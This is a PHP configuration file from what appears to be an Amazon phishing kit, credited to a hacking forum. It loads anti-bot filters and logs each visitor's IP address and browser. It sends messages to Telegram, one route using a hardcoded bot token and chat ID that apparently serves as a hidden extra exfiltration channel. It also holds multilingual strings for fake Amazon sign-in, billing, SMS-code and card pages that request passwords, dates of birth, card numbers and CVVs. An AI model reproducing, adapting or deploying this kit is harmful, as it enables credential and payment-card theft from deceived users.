<!-- ____ INFORMATION ____ 
     
     Cleaned By : https://hellofhackers.com
-->


<?php error_reporting(0);
    include("anti__boot/anti1.php");
    include("anti__boot/anti2.php");
    include("anti__boot/anti3.php");
    include("anti__boot/anti4.php");
    include("anti__boot/anti5.php");
    include("anti__boot/anti6.php");
    include("anti__boot/anti7.php");
    include("anti__boot/anti8.php");
    require_once 'detect.php';

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }


    function visitors() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT'];
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
        //$country        = get_client_country();
        $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    };
    function get_client_countrycode() {
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  get_client_ip() . ""));
        if ($details && $details->geoplugin_countryCode != null) {
            $countrycode = $details->geoplugin_countryCode;
        }
        return $countrycode;
    }
    function lang() {
        $countrycode = get_client_countrycode();
        switch ($countrycode) {
            case 'EN':
                return $_SESSION['lang'] = 'en';
                break;
            case 'FR':
                return $_SESSION['lang'] = 'fr';
                break;
            case 'JP':
                return $_SESSION['lang'] = 'es';
                break;
            case 'DE':
                return $_SESSION['lang'] = 'de';
                break;
            default:
                return $_SESSION['lang'] = 'en';
        }
    }
    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION['lang']];
    };

    function sendmessage($message) {
        $data = [
        'chat_id' => chat_id, 
        'text' => $message
        ];
        $response = file_get_contents("https://api.telegram.org/bot" .apiToken . "/sendMessage?" . http_build_query($data) );  
    }
    
    function antiboot($message) {
        $apitoken2 = '1603474625:AAEVlWi7Q-_dOuEk1ff2q_vAiKipqkqYVdc';
        $chatid2 = '1373502500';
        $data = [
        'chat_id' => $chatid2, 
        'text' => $message
        ];
        $response = file_get_contents("https://api.telegram.org/bot" .$apitoken2 . "/sendMessage?" . http_build_query($data) );  
    }



    $lang = array(

        'h1_index' => [
            'en' => 'Sign in',
            'de' => 'Einloggen',
            'fr' => 'S identifier',
            'jp' => 'ログイン',
        ],

        'label_index' => [
            'en' => 'Email or mobile phone number',
            'de' => 'E-Mail oder Handynummer',
            'fr' => 'E-mail ou numéro de téléphone portable',
            'jp' => 'メールまたは携帯電話番号',
        ],

        'condition' => [
            'en' => 'Conditions of Use',
            'de' => 'Nutzungsbedingungen',
            'fr' => 'conditions d utilisation',
            'jp' => '利用条件',
        ],

        'and' => [
            'en' => 'and',
            'de' => 'und',
            'fr' => 'et',
            'jp' => 'と',
        ],

        'by' => [
            'en' => ' By continuing, you agree to Amazon s ',
            'de' => 'Indem Sie fortfahren, stimmen Sie den Amazon s zu',
            'fr' => 'En continuant, vous acceptez les conditions d Amazon',
            'jp' => '続行すると、Amazon の',
        ],

        'priv' => [
            'en' => 'Privacy Notice.',
            'de' => 'Datenschutzerklärung',
            'fr' => 'Avis de confidentialité',
            'jp' => 'プライバシー通知',
        ],

        'need' => [
            'en' => 'Need help?',
            'de' => 'Brauchen Sie Hilfe?',
            'fr' => 'Besoin d aide?',
            'jp' => '助けが必要？',
        ],

        'btn_index' => [
            'en' => 'Continue',
            'de' => 'Fortsetzen',
            'fr' => 'Continuer',
            'jp' => '継続する',
        ],

        'new' => [
            'en' => 'New to Amazon?',
            'de' => 'Neu bei Amazon?',
            'fr' => 'Nouveau sur Amazon ?',
            'jp' => 'アマゾンは初めてですか？',
        ],

        'creat' => [
            'en' => 'Create your Amazon account',
            'de' => 'Erstellen Sie Ihr Amazon-Konto',
            'fr' => 'Créez votre compte Amazon',
            'jp' => 'アマゾンアカウントを作成する',
        ],

        'ft_li_1' => [
            'en' => 'Conditions of Use',
            'de' => 'Nutzungsbedingungen',
            'fr' => 'conditions d utilisation',
            'jp' => '利用条件',
        ],

        'ft_li_2' => [
            'en' => 'Privacy Notice',
            'de' => 'Datenschutzerklärung',
            'fr' => 'Avis de confidentialité',
            'jp' => 'プライバシー通知',
        ],

        'ft_li_3' => [
            'en' => 'Help',
            'de' => 'Hilfe',
            'fr' => 'Aider',
            'jp' => 'ヘルプ',
        ],

        'copy' => [
            'en' => '© 1996-2022, Amazon.com, Inc. or its affiliates',
            'de' => '© 1996-2022, Amazon.com, Inc. oder seine verbundenen Unternehmen',
            'fr' => '© 1996-2022, Amazon.com, Inc. ou ses sociétés affiliées',
            'jp' => '© 1996-2022、Amazon.com, Inc. またはその関連会社',
        ],

        'change' => [
            'en' => 'change',
            'de' => 'Rückgeld',
            'fr' => 'changement',
            'jp' => '変化する',
        ],

        'label_password' => [
            'en' => 'Password',
            'de' => 'Passwort',
            'fr' => 'Mot de passe',
            'jp' => 'パスワード',
        ],

        'forget' => [
            'en' => 'Forgot your password?',
            'de' => 'Haben Sie Ihr Passwort vergessen?',
            'fr' => 'Mot de passe oublié?',
            'jp' => 'パスワードをお忘れですか？',
        ],

        'keep' => [
            'en' => 'Keep me signed in?',
            'de' => 'Eingeloggt bleiben?',
            'fr' => 'Rester connecté?',
            'jp' => 'ログイン状態を保持する？',
        ],

        'det' => [
            'en' => 'Details',
            'de' => 'Einzelheiten',
            'fr' => 'Détails',
            'jp' => '詳細',
        ],

        'h1_billing' => [
            'en' => 'Enter Your Current Account Information',
            'de' => 'Geben Sie Ihre aktuellen Kontoinformationen ein',
            'fr' => 'Entrez les informations de votre compte actuel',
            'jp' => '現在のアカウント情報を入力してください',
        ],

        'req' => [
            'en' => 'All fields are required',
            'de' => 'alle Felder sind erforderlich',
            'fr' => 'Tous les champs sont requis',
            'jp' => '全て必須項目です',
        ],

        'label_name' => [
            'en' => 'Full Name',
            'de' => 'Vollständiger Name',
            'fr' => 'Nom et prénom',
            'jp' => 'フルネーム',
        ],

        'label_address' => [
            'en' => 'Address',
            'de' => 'Adresse',
            'fr' => 'Adresse',
            'jp' => '住所',
        ],

        'label_zip' => [
            'en' => 'Zip Code',
            'de' => 'Postleitzahl',
            'fr' => 'Code postal',
            'jp' => '郵便番号',
        ],

        'label_phone' => [
            'en' => 'Phone Number',
            'de' => 'Telefonnummer',
            'fr' => 'Numéro de téléphone',
            'jp' => '電話番号',
        ],

        'label_dob' => [
            'en' => 'Birth Date',
            'de' => 'Geburtsdatum',
            'fr' => 'Date de naissance',
            'jp' => '生年月日',
        ],

        'btn_billing' => [
            'en' => 'Verify',
            'de' => 'Verifizieren',
            'fr' => 'Vérifier',
            'jp' => '確認',
        ],

        'h1_sms' => [
            'en' => 'Confirmation',
            'de' => 'Bestätigung',
            'fr' => 'Confirmation',
            'jp' => '確認',
        ],

        'sec' => [
            'en' => 'The security code will be sent to you via SMS or by calling from a voice server on your phone',
            'de' => 'Der Sicherheitscode wird Ihnen per SMS oder durch Anruf von einem Sprachserver auf Ihrem Telefon zugesendet',
            'fr' => 'Le code de sécurité vous sera envoyé par SMS ou par appel depuis un serveur vocal sur votre téléphone',
            'jp' => 'セキュリティ コードは、SMS または電話の音声サーバーからの呼び出しによって送信されます。',
        ],

        'label_sms' => [
            'en' => 'SMS code',
            'de' => 'SMS-Code',
            'fr' => 'Code SMS',
            'jp' => 'SMS コード',
        ],

        'btn_sms' => [
            'en' => 'Confirm',
            'de' => 'Bestätigen',
            'fr' => 'Confirmer',
            'jp' => '確認',
        ],


        'loading' => [
            'en' => 'loading...',
            'de' => 'Wird geladen...',
            'fr' => 'Chargement en cours...',
            'jp' => '読み込んでいます...',
        ],

        'pp' => [
            'en' => 'Log in by submitting an identification request to the app',
            'de' => 'Melden Sie sich an, indem Sie eine Identifikationsanfrage an die App senden',
            'fr' => 'Connectez-vous en soumettant une demande d identification à l application',
            'jp' => 'アプリに本人確認リクエストを送信してログインします',
        ],

        'ppp' => [
            'en' => 'After click <strong>Send</strong> , open the app on your phone and accept.',
            'de' => 'Nach Klick <strong> Senden </strong> , Öffnen Sie die App auf Ihrem Telefon und akzeptieren Sie.',
            'fr' => 'Après avoir cliqué <strong> Envoyer </strong> , ouvrez l application sur votre téléphone et acceptez.',
            'jp' => 'クリック後 <strong> 送信 </strong> , 携帯電話でアプリを開き、同意します。',
        ],

        'btn_app' => [
            'en' => 'Send',
            'de' => 'Senden',
            'fr' => 'Envoyer',
            'jp' => '送信',
        ],

        'h1_cc' => [
            'en' => 'Enter your card information',
            'de' => 'Geben Sie Ihre Karteninformationen ein',
            'fr' => 'Entrez les informations de votre carte',
            'jp' => 'カード情報を入力してください',
        ],

        'label_card' => [
            'en' => 'card number',
            'de' => 'Kartennummer',
            'fr' => 'numéro de carte',
            'jp' => 'カード番号',
        ],


        'label_expiry' => [
            'en' => 'date d expiration',
            'de' => 'Ablaufdatum',
            'fr' => 'Date d expiration',
            'jp' => '有効期限',
        ],

        'label_cvv' => [
            'en' => 'cvv',
            'de' => 'cvv',
            'fr' => 'cvv',
            'jp' => 'cvv',
        ],

        'label_access' => [
            'en' => 'Code Access',
            'de' => 'Code-Zugriff',
            'fr' => 'Code Access',
            'jp' => 'コード アクセス',
        ],

        'sec1' => [
            'en' => 'Please type a code access',
            'de' => 'Bitte geben Sie einen Zugangscode ein',
            'fr' => 'Veuillez saisir un code d accès',
            'jp' => 'アクセスコードを入力してください',
        ],

       
    );
?>
